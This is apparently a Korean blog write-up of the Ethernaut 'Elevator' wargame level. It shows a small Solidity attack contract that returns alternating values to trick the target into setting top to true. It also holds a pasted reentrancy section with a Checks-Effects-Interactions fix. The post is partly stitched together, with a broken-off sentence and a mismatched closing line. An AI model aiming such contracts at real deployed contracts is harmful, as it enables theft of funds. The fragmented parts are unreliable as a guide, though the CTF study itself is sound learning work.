문제 해설에 들어가기 전,  이번 포스팅은 이더넛 내에서 콘솔창과 상호작용을 할 줄 알고 기본적인 리믹스 및 메타마스크 사용법이 숙지되어 있다는 가정 하에 해설을 진행합니다.



## Elevator Problem

이번 문제의 힌트를 보아도 잘 감이 오지 않는다.

 - 때때로 솔리디티는 약속을 잘 지키지 않는다.
 - 이 엘리베이터가 빌딩에서 사용되길 기대한다.



나는 이 elevator 문제를 한참동안 들여다 봐도 무엇이 잘못 되었는지, 찾지 못햇다. 우선 문제 주소를 remix에 넣고 컨트랙트 주소를 불러오자! 이때, 인터페이스는 배포가 불가능하니 꼭 셀렉트를 Elevator로 바꾸고 At Address를 진행하자. 처음에 문제로 출제된 Elevator 주소를 불러와 top함수를 호출하면 불값이 false로 되어 있다. 

![](C:\Users\hwave\Documents\GitHub\TIL-about-Blockchain\img\elevator01.png)

문제에서, 이 엘리베이터는 *"너의 빌딩에 꼭대기에 도달할수 없는게 맞지?"* 라고 하는 것을 보아 top을 true 값으로 바꾸면 문제를 통과 할 수 있다.





### ElevatorAttack.sol 

```javascript
pragma solidity ^0.4.18;

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
```

view 키워드가 있는 인터페이스와 



이후 이더넛의 콘솔창에서 await contract.top()를 치면 true 값으로 바뀐 것을 확인 할 수 있고, 다음 문제로 넘어갈 수 있다.





---



 [1.3이더 가져오기](https://ropsten.etherscan.io/tx/0x3a335a244b29a19612f6302ce9d5b22e6f4a217352e41cf79ed7e6e7766cb348) 

![](C:\Users\hwave\Documents\GitHub\TIL-about-Blockchain\img\reentrance03.png)



그렇다면, 우리는 위와 같은 재진입성 문제를 막기 위해서는 어떻게 코딩을 해야 할까? 

송금과 관련하여 안전한 코딩을 위해서는 `Condition - Effects - Interation` 패턴을 지닌 `pull형 payable`을 사용해야한다. 



### Condition - Effects - Interation

> - Condition
>
>   함수를 실행하는 조건을 확인하고 조건이 유효하지 않을 때는 처리를 중단
>
> - Effects
>
>   상태를 업데이트 (ex : 경매일 경우, 반환 금액 여기 손봐야함 적절한 예시로)
>
> - Interaction
>
>   다른 컨트랙트에 메시지를 보낸다 (ex : 입찰금)



CEI패턴을 지키기 위해서는 처음에 주어지 코드를 아래와 같이 수정하면 된다.

```javascript
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      
      balances[msg.sender] -= _amount;
      
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
    }
  }
```

직접 리믹스 자바스크립트 VM환경에서 수정된 코드를 배포하여 실험을 해보면 확실하게 알 수 있다.



그럼, 다음번에는 11단계 Elevator에서 만나요!